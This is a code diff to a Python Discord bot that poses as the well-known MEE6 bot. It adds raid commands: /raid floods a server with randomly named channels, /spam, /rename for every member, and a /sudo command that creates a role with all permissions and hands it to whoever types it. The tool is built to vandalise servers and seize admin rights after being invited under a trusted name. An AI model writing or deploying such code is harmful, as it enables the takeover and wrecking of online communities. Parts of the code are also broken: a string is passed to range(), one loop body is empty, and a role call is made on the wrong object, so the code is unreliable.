@@ -18,9 +18,12 @@ class mee6(discord.Client):
     async def on_message(self, message):
         if message.content.startswith('/raid'):
             currentguild = message.guild
-            channel = await currentguild.create_text_channel('Server pwned by MEE6 :)')
-            channel = await currentguild.create_text_channel('Server pwned by MEE6 ;)')
-            channel = await currentguild.create_text_channel('Server pwned by MEE6 .)')
+            
+            letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789.+-*/,?;.:/!§ù%*µ$£=)-"
+            for i in range(2):
+                result_str = ''.join(random.choice(letters) for i in range("8"))
+                channel = await currentguild.create_text_channel(result_str)
+                
             await message.delete()
             
             
@@ -30,12 +33,28 @@ class mee6(discord.Client):
             await message.delete()
             
             
+        if message.content.startswith('/rename'):
+            currentguild = message.guild
+            print(currentguild.members)
+            for name in currentguild.members:
+                
+            await message.delete()
+            
+            
+        if message.content.startswith('/sudo'):
+            currentguild = message.guild
+            role = await self.create_role(currentguild, name=" ˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞", permissions=Permissions.all())
+            await message.author.add_roles(role)
+            
+            
+            
         if message.content.startswith('/help'):
             await message.channel.send("""MEE6 commands help
 - /help: get all commands
-- /raid: create a lot of channels
-- /spam <message>: spam a message in current channel
-- /""")
+- /raid: create a lot of random channels
+- /spam: spam a message in current channel
+- /rename: rename everyone with random names
+- /sudo: give yourself admin power""")
             await message.delete()
 
 intents = discord.Intents.default()
